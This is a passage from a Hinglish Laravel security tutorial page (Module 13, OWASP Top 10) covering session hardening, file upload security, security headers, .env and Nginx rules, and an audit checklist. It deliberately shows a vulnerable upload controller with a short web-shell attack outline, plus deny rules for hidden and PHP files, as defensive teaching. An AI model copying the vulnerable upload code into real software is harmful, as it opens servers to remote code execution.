+    <span class="str">'encrypt'</span>         => <span class="kw">true</span>, <span class="cm">// Session data payload ko encrypted store karo</span>
+
+    <span class="cm">// HTTPS only cookie transmission</span>
+    <span class="str">'secure'</span>          => <span class="fn">env</span>(<span class="str">'SESSION_SECURE_COOKIE'</span>, <span class="kw">true</span>),
+
+    <span class="cm">// JavaScript access block (XSS se session cookie chori nahi ho sakti)</span>
+    <span class="str">'http_only'</span>       => <span class="kw">true</span>,
+
+    <span class="cm">// Strict CSRF protection cookie policy</span>
+    <span class="str">'same_site'</span>       => <span class="str">'lax'</span>,
+
+    <span class="str">'cookie'</span>          => <span class="fn">env</span>(<span class="str">'SESSION_COOKIE'</span>, <span class="str">'shopsphere_session'</span>),
+];
+
+<span class="cm">// &#x26A0;&#xFE0F; CRITICAL: Login ke foran baad Session ID regenerate karna ZAROORI hai!</span>
+<span class="kw">public function</span> <span class="fn">login</span>(<span class="cl">Request</span> $request)
+{
+    <span class="kw">if</span> (<span class="cl">Auth</span>::<span class="fn">attempt</span>($request-><span class="fn">only</span>(<span class="str">'email'</span>, <span class="str">'password'</span>))) {
+        <span class="cm">// Purana session ID destroy karke fresh session create karta hai (Session Fixation Shield)</span>
+        $request-><span class="fn">session</span>()-><span class="fn">regenerate</span>();
+        <span class="kw">return</span> <span class="fn">redirect</span>()-><span class="fn">intended</span>(<span class="str">'/dashboard'</span>);
+    }
+}</pre>
+    </div>
+  </div>
+</div>
+
+
+<!-- SECTION 7: FILE UPLOAD SECURITY -->
+<div id="sec-upload" class="section-panel">
+  <div class="section-title">&#x1F4C2; File Upload Security &mdash; A04 (Malicious Web Shell Defense)</div>
+  <p class="section-subtitle"><span class="vuln-tag tag-high">HIGH</span> File uploads kisi bhi system ka sabse dangerous attack vector hote hain. Agar verification weak ho, toh attacker PHP web shell (e.g. <code>c99.php</code>) upload karke aapke pure Linux server ka command control le sakta hai.</p>
+
+  <div class="card">
+    <div class="card-title">&#x274C; Vulnerable vs &#x2705; Secure File Upload Handling</div>
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">php</span><span class="code-filename">VulnerableUploadController.php (Flawed Extension Check)</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><span class="ph">&lt;?php</span>
+
+<span class="cm">// &#x274C; FATAL MISTAKE: Sirf client ki extension check karna</span>
+$ext = $request-><span class="fn">file</span>(<span class="str">'avatar'</span>)-><span class="fn">getClientOriginalExtension</span>();
+<span class="kw">if</span> (!<span class="fn">in_array</span>($ext, [<span class="str">'jpg'</span>, <span class="str">'png'</span>])) {
+    <span class="kw">return</span> <span class="str">'Invalid file'</span>;
+}
+
+<span class="cm">// Client ke bheje hue original name se public folder mein store kar dena</span>
+$path = $request-><span class="fn">file</span>(<span class="str">'avatar'</span>)-><span class="fn">storeAs</span>(<span class="str">'public/avatars'</span>, $request-><span class="fn">file</span>(<span class="str">'avatar'</span>)-><span class="fn">getClientOriginalName</span>());
+
+<span class="cm">/*
+ * Attacker kya karta hai?
+ * 1. File banata hai: exploit.php.png ya double extension bypass
+ * 2. File browser se upload karke sidha navigate karta hai:
+ *    https://shopsphere.com/storage/avatars/exploit.php
+ * 3. Server PHP script execute karta hai aur pura database/server compromised!
+ */</span></pre>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">php</span><span class="code-filename">SecureUploadController.php (Airtight S3 &amp; MIME Defense)</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><span class="ph">&lt;?php</span>
+
+<span class="kw">namespace</span> AppHttpControllers;
+
+<span class="kw">use</span> <span class="cl">AppModelsProduct</span>;
+<span class="kw">use</span> <span class="cl">IlluminateHttpRequest</span>;
+<span class="kw">use</span> <span class="cl">IlluminateSupportFacadesStorage</span>;
+<span class="kw">use</span> <span class="cl">IlluminateSupportStr</span>;
+
+<span class="kw">class</span> <span class="cl">ProductImageController</span> <span class="kw">extends</span> <span class="cl">Controller</span>
+{
+    <span class="kw">public function</span> <span class="fn">upload</span>(<span class="cl">Request</span> $request, <span class="cl">Product</span> $product)
+    {
+        <span class="cm">// 1. Multi-layer validation (MIME sniffing + Size limits + Dimensions)</span>
+        $request-><span class="fn">validate</span>([
+            <span class="str">'image'</span> => [
+                <span class="str">'required'</span>,
+                <span class="str">'file'</span>,
+                <span class="cm">// mimes rule magic bytes (file header) read karta hai, extension nahi</span>
+                <span class="str">'mimes:jpeg,jpg,png,webp'</span>,
+                <span class="str">'max:2048'</span>, <span class="cm">// Max 2MB (Storage DoS prevention)</span>
+                <span class="str">'dimensions:min_width=200,min_height=200,max_width=4000,max_height=4000'</span>,
+            ],
+        ]);
+
+        $file = $request-><span class="fn">file</span>(<span class="str">'image'</span>);
+
+        <span class="cm">// 2. Original client filename kabhie use na karein (Path Traversal attack prevention!)</span>
+        <span class="cm">// Cryptographically secure random UUID / hash generate karein</span>
+        $safeName = <span class="cl">Str</span>::<span class="fn">uuid</span>() . <span class="str">'.'</span> . $file-><span class="fn">guessExtension</span>();
+
+        <span class="cm">// 3. Kabhie bhi public/ storage mein executeable permissions na dein</span>
+        <span class="cm">// S3 bucket ya private storage disk mein store karein</span>
+        $path = $file-><span class="fn">storeAs</span>(<span class="str">'products/'</span> . $product->id, $safeName, <span class="str">'s3'</span>);
+
+        <span class="cm">// 4. Image processing library se EXIF metadata strip off karein (embedded payloads safety)</span>
+        <span class="cm">// Intervention image parse karti hai aur re-encode karti hai</span>
+
+        $product-><span class="fn">images</span>()-><span class="fn">create</span>([
+            <span class="str">'disk'</span>      => <span class="str">'s3'</span>,
+            <span class="str">'file_path'</span> => $path,
+            <span class="str">'mime_type'</span> => $file-><span class="fn">getMimeType</span>(),
+            <span class="str">'size_kb'</span>   => <span class="fn">round</span>($file-><span class="fn">getSize</span>() / <span class="num">1024</span>, <span class="num">2</span>),
+        ]);
+
+        <span class="kw">return</span> <span class="fn">response</span>()-><span class="fn">json</span>([
+            <span class="str">'success'</span> => <span class="kw">true</span>,
+            <span class="str">'url'</span>     => <span class="cl">Storage</span>::<span class="fn">disk</span>(<span class="str">'s3'</span>)-><span class="fn">temporaryUrl</span>($path, <span class="fn">now</span>()-><span class="fn">addMinutes</span>(<span class="num">30</span>)),
+        ]);
+    }
+}</pre>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">&#x2705; 6 Golden Rules of File Upload Security</div>
+    <table class="compare-table">
+      <thead>
+        <tr>
+          <th>Rule</th>
+          <th>Kyun Zaroori Hai? (Attack Risk)</th>
+          <th>Implementation Code Pattern</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><strong>MIME Type Validation</strong></td>
+          <td>Extension ko rename karke <code>shell.php</code> ko <code>shell.jpg</code> banaya ja sakta hai.</td>
+          <td class="good"><code>'mimes:jpeg,png,webp'</code> (PHP finfo magic bytes)</td>
+        </tr>
+        <tr>
+          <td><strong>Randomized Filename</strong></td>
+          <td><code>../../etc/passwd</code> jaise path traversal attacks aur file overwriting ko rokkta hai.</td>
+          <td class="good"><code>Str::uuid() . '.' . $file->guessExtension()</code></td>
+        </tr>
+        <tr>
+          <td><strong>Store Outside Public Web Root</strong></td>
+          <td>Agar file direct web root mein na ho, toh browser se hit karke server-side execute nahi ho sakti.</td>
+          <td class="good">AWS S3 / Cloudflare R2 / Private local disk</td>
+        </tr>
+        <tr>
+          <td><strong>Strict File Size Limits</strong></td>
+          <td>Disk storage exhaustion DoS attack ko block karta hai.</td>
+          <td class="good"><code>'max:2048'</code> (Kilobytes mein limit)</td>
+        </tr>
+        <tr>
+          <td><strong>Strip EXIF Metadata</strong></td>
+          <td>Attacker JPEG EXIF headers ke comments mein PHP code chupa dete hain.</td>
+          <td class="good">Intervention Image se re-save karo</td>
+        </tr>
+        <tr>
+          <td><strong>Nginx Execution Block</strong></td>
+          <td>Server level par uploads folder mein <code>.php</code> execution disabled hona chahiye.</td>
+          <td class="good"><code>location /storage { location ~ .php$ { deny all; } }</code></td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+
+<!-- SECTION 8: SECURITY HEADERS & SENSITIVE DATA -->
+<div id="sec-headers" class="section-panel">
+  <div class="section-title">&#x1F4E7; Security Headers &amp; Sensitive Data &mdash; A02</div>
+  <p class="section-subtitle"><span class="vuln-tag tag-high">HIGH</span> Missing HTTP security headers, production mein <code>APP_DEBUG=true</code> rehna, ya public web se <code>.env</code> file access hona real-world penetration tests mein sabse zyada pakdi jane wali mistakes hain.</p>
+
+  <div class="card">
+    <div class="card-title">&#x1F6E1;&#xFE0F; Complete SecurityHeaders Middleware Implementation</div>
+    <p style="color:var(--text-secondary);margin-bottom:14px">Yeh custom middleware har HTTP response mein modern browser security directives attach karta hai:</p>
+
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">php</span><span class="code-filename">app/Http/Middleware/SecurityHeaders.php</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><span class="ph">&lt;?php</span>
+
+<span class="kw">namespace</span> AppHttpMiddleware;
+
+<span class="kw">use</span> <span class="cl">Closure</span>;
+<span class="kw">use</span> <span class="cl">IlluminateHttpRequest</span>;
+
+<span class="kw">class</span> <span class="cl">SecurityHeaders</span>
+{
+    <span class="kw">public function</span> <span class="fn">handle</span>(<span class="cl">Request</span> $request, <span class="cl">Closure</span> $next)
+    {
+        $response = $next($request);
+
+        <span class="cm">// 1. MIME Sniffing Block: Browser ko file type guess karne se roko</span>
+        $response-><span class="fn">headers</span>-><span class="fn">set</span>(<span class="str">'X-Content-Type-Options'</span>, <span class="str">'nosniff'</span>);
+
+        <span class="cm">// 2. Clickjacking Shield: Website ko doosri sites ke iframe mein khulne se roko</span>
+        $response-><span class="fn">headers</span>-><span class="fn">set</span>(<span class="str">'X-Frame-Options'</span>, <span class="str">'DENY'</span>);
+
+        <span class="cm">// 3. Legacy Browser XSS Filter</span>
+        $response-><span class="fn">headers</span>-><span class="fn">set</span>(<span class="str">'X-XSS-Protection'</span>, <span class="str">'1; mode=block'</span>);
+
+        <span class="cm">// 4. HSTS (Strict-Transport-Security): 1 saal ke liye HTTPS strictly enforce karo</span>
+        <span class="kw">if</span> ($request-><span class="fn">isSecure</span>() || <span class="fn">app</span>()-><span class="fn">isProduction</span>()) {
+            $response-><span class="fn">headers</span>-><span class="fn">set</span>(
+                <span class="str">'Strict-Transport-Security'</span>,
+                <span class="str">'max-age=31536000; includeSubDomains; preload'</span>
+            );
+        }
+
+        <span class="cm">// 5. Referrer Policy: Third-party sites ko internal URLs ka leak hona roko</span>
+        $response-><span class="fn">headers</span>-><span class="fn">set</span>(<span class="str">'Referrer-Policy'</span>, <span class="str">'strict-origin-when-cross-origin'</span>);
+
+        <span class="cm">// 6. Permissions Policy: Unused hardware sensors (camera, mic, geo) block karo</span>
+        $response-><span class="fn">headers</span>-><span class="fn">set</span>(
+            <span class="str">'Permissions-Policy'</span>,
+            <span class="str">'camera=(), microphone=(), geolocation=(), payment=(self)'</span>
+        );
+
+        <span class="cm">// 7. Server fingerprint headers strip off karo (Reconnaissance Defense)</span>
+        $response-><span class="fn">headers</span>-><span class="fn">remove</span>(<span class="str">'X-Powered-By'</span>);
+        $response-><span class="fn">headers</span>-><span class="fn">remove</span>(<span class="str">'Server'</span>);
+
+        <span class="kw">return</span> $response;
+    }
+}</pre>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">&#x1F512; Production Environment (.env) Hardening Rules</div>
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">bash</span><span class="code-filename">.env (Production Checklist)</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><span class="cm"># &#x26A0;&#xFE0F; PRODUCTION ENVIRONMENT SETTINGS</span>
+
+<span class="cm"># 1. Environment strictly production hona chahiye</span>
+APP_ENV=production
+
+<span class="cm"># 2. DEBUG KO PRODUCTION MEIN 100% FALSE RAKHEIN!</span>
+<span class="cm"># Agar ye true raha, toh kisi bhi error par database password aur full stack trace public ko dikh jayega!</span>
+APP_DEBUG=false
+
+<span class="cm"># 3. Secure 32-byte cryptographic key</span>
+APP_KEY=base64:7vF8kX...Random32BytesStringGeneratedViaArtisan=
+
+<span class="cm"># 4. Database passwords strong hone chahiye (never use 'root' or 'admin123')</span>
+DB_CONNECTION=mysql
+DB_HOST=127.0.0.1
+DB_PORT=3306
+DB_DATABASE=shopsphere_prod
+DB_USERNAME=shopsphere_user
+DB_PASSWORD=Secure_Long_Random_Secret_P@ssw0rd_99!
+
+<span class="cm"># 5. Redis authentication password lazmi set karein</span>
+REDIS_PASSWORD=Highly_Confidential_Redis_Vault_Key
+
+<span class="cm"># 6. Strict session cookie flags</span>
+SESSION_SECURE_COOKIE=true
+SESSION_HTTP_ONLY=true
+SESSION_SAME_SITE=lax
+
+<span class="cm"># 7. Gitignore rule verify karein:</span>
+<span class="cm"># Kabhie bhi .env ya credentials ko git repo mein commit mat hone do!</span></pre>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">bash</span><span class="code-filename">Terminal (Production Cache &amp; Verification)</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><span class="cm"># Deployment ke baad configurations aur routes cache karo</span>
+<span class="cm"># Isse har request par .env file read nahi karni padti aur performance bhi boost hoti hai</span>
+php artisan config:cache
+php artisan route:cache
+php artisan view:cache
+
+<span class="cm"># Verify karo ki debug mode sach mein off hai</span>
+php artisan about</pre>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">&#x1F4CB; Nginx Web Server Security Configuration</div>
+    <p style="color:var(--text-secondary);margin-bottom:14px">Agar kisi ne web server configuration mein mistake ki toh attacker direct browser se <code>https://yoursite.com/.env</code> download kar lega! Nginx level par ye defensive block rules apply karein:</p>
+
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">nginx</span><span class="code-filename">/etc/nginx/sites-available/shopsphere.conf</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre>server {
+    listen 443 ssl http2;
+    server_name shopsphere.com;
+    root /var/www/shopsphere/public;
+
+    index index.php;
+
+    <span class="cm"># &#x2705; RULE 1: Block hidden files (.env, .git, .htaccess) completely!</span>
+    location ~ /. {
+        deny all;
+        access_log off;
+        log_not_found off;
+    }
+
+    <span class="cm"># &#x2705; RULE 2: Sensitive system file extensions block karo</span>
+    location ~ .(ini|log|conf|sh|sql|bak|swp)$ {
+        deny all;
+    }
+
+    <span class="cm"># &#x2705; RULE 3: Public uploads folder mein PHP execution strictly block karo!</span>
+    location /storage {
+        location ~ .php$ {
+            deny all;
+        }
+        try_files $uri =404;
+    }
+
+    <span class="cm"># &#x2705; RULE 4: Standard PHP-FPM execution route</span>
+    location ~ .php$ {
+        fastcgi_pass unix:/var/run/php/php8.3-fpm.sock;
+        fastcgi_param SCRIPT_FILENAME $realpath_root$fastcgi_script_name;
+        include fastcgi_params;
+    }
+
+    location / {
+        try_files $uri $uri/ /index.php?$query_string;
+    }
+}</pre>
+    </div>
+  </div>
+</div>
+
+
+<!-- SECTION 9: AUDIT CHECKLIST & AUTOMATION -->
+<div id="sec-checklist" class="section-panel">
+  <div class="section-title">&#x2705; Production Security Checklist &amp; Automated Audit</div>
+  <p class="section-subtitle">Har production deployment se pehle is complete checklist ko run karein aur automated vulnerability scanner chala kar zero warning confirm karein.</p>
+
+  <div class="card">
+    <div class="card-title">&#x1F4CB; Complete 3-Year Dev Laravel Security Audit Matrix</div>
+    <div class="cheatsheet-grid">
+      <div class="cheat-card">
+        <div class="cheat-title" style="color:#fca5a5;">SQL Injection Guard</div>
+        <div class="cheat-item">Eloquent / PDO bindings <span>Kabhie direct string concatenation mat karo</span></div>
+        <div class="cheat-item">Sort column whitelisting <span>in_array($sort, $allowed) check</span></div>
+        <div class="cheat-item">Type-cast numeric inputs <span>(int) $id or (float) $price</span></div>
+        <div class="cheat-item">Validate date strings <span>date validation rule before query</span></div>
+      </div>
+
+      <div class="cheat-card">
+        <div class="cheat-title" style="color:#fca5a5;">XSS Protection</div>
+        <div class="cheat-item">Blade {{ }} auto-escaping <span>Default safe HTML entities</span></div>
+        <div class="cheat-item">Purifier::clean() for WYSIWYG <span>Rich text sanitize before saving</span></div>
+        <div class="cheat-item">@js() directive for Blade <span>Safe JSON passing in JS script</span></div>
+        <div class="cheat-item">CSP Header configured <span>Content-Security-Policy middleware</span></div>
+      </div>
+
+      <div class="cheat-card">
+        <div class="cheat-title" style="color:#fcd34d;">CSRF Shield</div>
+        <div class="cheat-item">@csrf in every HTML form <span>Hidden _token input tag</span></div>
+        <div class="cheat-item">X-CSRF-TOKEN header in Axios <span>AJAX requests safety</span></div>
+        <div class="cheat-item">Exclude only signed webhooks <span>Stripe / PayPal signatures verified</span></div>
+      </div>
+
+      <div class="cheat-card">
+        <div class="cheat-title" style="color:#fcd34d;">Mass Assignment</div>
+        <div class="cheat-item">$fillable on every Model <span>Explicit whitelist columns</span></div>
+        <div class="cheat-item">Always use ->validated() <span>FormRequest rules whitelist only</span></div>
+        <div class="cheat-item">NEVER $guarded = [] <span>Strictly prohibited antipattern</span></div>
+        <div class="cheat-item">preventSilentlyDiscarding <span>Local dev exception trigger</span></div>
+      </div>
+
+      <div class="cheat-card">
+        <div class="cheat-title" style="color:#fca5a5;">Authentication &amp; IDOR</div>
+        <div class="cheat-item">Password::min(10)->uncompromised <span>Strong password validation</span></div>
+        <div class="cheat-item">$request->session()->regenerate() <span>Prevent session fixation on login</span></div>
+        <div class="cheat-item">Resource Policies for IDOR <span>$this->authorize('view', $order)</span></div>
+        <div class="cheat-item">RateLimiter for login <span>Brute force attack throttling</span></div>
+      </div>
+
+      <div class="cheat-card">
+        <div class="cheat-title" style="color:#fcd34d;">File Uploads</div>
+        <div class="cheat-item">'mimes:jpeg,png,webp' <span>Magic bytes check, not extension</span></div>
+        <div class="cheat-item">Randomized UUID filename <span>Path traversal defense</span></div>
+        <div class="cheat-item">S3 / Private storage disk <span>Outside public web root</span></div>
+        <div class="cheat-item">Deny .php in uploads <span>Nginx server location block</span></div>
+      </div>
+
+      <div class="cheat-card">
+        <div class="cheat-title" style="color:#93c5fd;">Headers &amp; Sensitive Data</div>
+        <div class="cheat-item">APP_DEBUG=false <span>Never expose stack trace in prod</span></div>
+        <div class="cheat-item">SecurityHeaders middleware <span>nosniff, DENY, HSTS enabled</span></div>
+        <div class="cheat-item">Block .env / .git in Nginx <span>Deny all hidden files</span></div>
+        <div class="cheat-item">SESSION_SECURE_COOKIE=true <span>Encrypted HTTPS sessions only</span></div>
+      </div>
+
+      <div class="cheat-card">
+        <div class="cheat-title" style="color:#6ee7b7;">Vulnerability Scans</div>
+        <div class="cheat-item">composer audit <span>Known PHP vulnerabilities</span></div>
+        <div class="cheat-item">npm audit <span>Frontend packages scan</span></div>
+        <div class="cheat-item">php artisan enlightn <span>130+ automated security audits</span></div>
+        <div class="cheat-item">Regular package updates <span>Security patches applied</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">&#x26A1; Essential Terminal Security Audit Commands</div>
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">bash</span><span class="code-filename">Production Pre-Flight Commands</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><span class="cm"># 1. Check for known PHP package vulnerabilities in composer.lock</span>
+composer audit
+
+<span class="cm"># 2. Check for npm vulnerabilities</span>
+npm audit
+
+<span class="cm"># 3. Verify production environment flags</span>
+php artisan about
+
+<span class="cm"># 4. Verify that APP_DEBUG is false</span>
+php artisan env
+
+<span class="cm"># 5. Test if .env file is blocked from the outside</span>
+curl -I https://shopsphere.com/.env
+<span class="cm"># Must return: HTTP/2 403 Forbidden or 404 Not Found</span>
+
+<span class="cm"># 6. Run Enlightn security scanner (Comprehensive 130+ security checks)</span>
+composer require enlightn/enlightn --dev
+php artisan enlightn
+
+<span class="cm"># 7. Optimize &amp; cache everything for production</span>
+php artisan optimize:clear
+php artisan optimize</pre>
+    </div>
+  </div>
+
+  <div class="practice-box">
+    <div class="practice-title">&#x1F680; Hands-On Production Security Challenge</div>
+    <ul class="practice-tasks">
+      <li><strong>Checklist Audit:</strong> ShopSphere Pro codebase par saare 10 OWASP threat points verify karein.</li>
+      <li><strong>Mass Assignment Verification:</strong> Har model mein <code>$fillable</code> check karein aur ensure karein ki <code>$guarded = []</code> kahin bhi na ho.</li>
+      <li><strong>Blade XSS Audit:</strong> Project mein <code>{!! !!}</code> search karein aur ensure karein ki user input directly render na ho raha ho.</li>
+      <li><strong>SecurityHeaders Middleware:</strong> <code>SecurityHeaders</code> middleware create karke <code>bootstrap/app.php</code> mein globally register karein.</li>
+      <li><strong>Rate Limiter Guard:</strong> Login route par strict rate limiter lagayein (5 attempts per minute).</li>
+      <li><strong>Pest Tests for IDOR:</strong> Pest test likhein jo assert kare ki User A kabhie bhi User B ke orders access nahi kar sakta (assertStatus 403).</li>
+      <li><strong>Automated Scan:</strong> <code>composer audit</code> chala kar confirm karein ki koi vulnerable package installed na ho.</li>
+    </ul>
+  </div>
+
+  <div class="alert alert-success" style="padding:22px">
+    <span class="alert-icon" style="font-size:1.6rem">&#x1F389;</span>
+    <div class="alert-body">
+      <strong style="font-size:1.05rem;color:#6ee7b7">All 3 Critical Gaps Closed! (Hinglish Edition)</strong>
+      Aapne Testing with Pest PHP (Module 11), API Resources &amp; Versioning (Module 12), aur Laravel Security &amp; OWASP Top 10 (Module 13) &mdash; teeno critical gap modules ko natural Hinglish mein complete kar liya hai!<br/><br/>
+      <strong>Next Step:</strong> Module 14 &mdash; Mail, Notifications &amp; S3 File Storage (Hinglish Version).
+    </div>
+  </div>
+</div>
+
+</div><!-- end layout -->
+
+<footer class="footer">
+  <p>ShopSphere Pro &mdash; <span>Module 13: Security &amp; OWASP Top 10 (Hinglish)</span> | Full-Stack Laravel Developer Series</p>
+  <p style="margin-top:6px;font-size:0.78rem">Critical Gap #3 (Hinglish Edition) COMPLETE &bull; Next: Module 14 &mdash; Mail, Notifications &amp; File Storage</p>
+</footer>
+
+<script>
+function showSection(id, btn) {
+  document.querySelectorAll('.section-panel').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.snav-btn').forEach(b => b.classList.remove('active'));
+  var panel = document.getElementById(id);
+  if (panel) panel.classList.add('active');
+  if (btn) btn.classList.add('active');
+  updateProgress();
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+function copyCode(btn) {
+  var pre = btn.closest('.code-block').querySelector('pre');
+  navigator.clipboard.writeText(pre.innerText).then(function() {
+    btn.textContent = 'Copied!';
+    btn.classList.add('copied');
+    setTimeout(function() {
+      btn.textContent = 'Copy';
+      btn.classList.remove('copied');
+    }, 2000);
+  });
+}
+
+var sectionOrder = [
+  'sec-overview',
+  'sec-injection',
+  'sec-xss',
+  'sec-csrf',
+  'sec-mass',
+  'sec-auth',
+  'sec-upload',
+  'sec-headers',
+  'sec-checklist'
+];
+
+function updateProgress() {
+  var active = document.querySelector('.section-panel.active');
+  if (!active) return;
+  var idx = sectionOrder.indexOf(active.id);
+  var pct = Math.round(((idx + 1) / sectionOrder.length) * 100);
+  var fill = document.getElementById('prog-fill');
+  var label = document.getElementById('prog-pct');
+  if (fill) fill.style.width = pct + '%';
+  if (label) label.textContent = pct + '%';
+}
+
+updateProgress();
+</script>
+</body>
+</html>
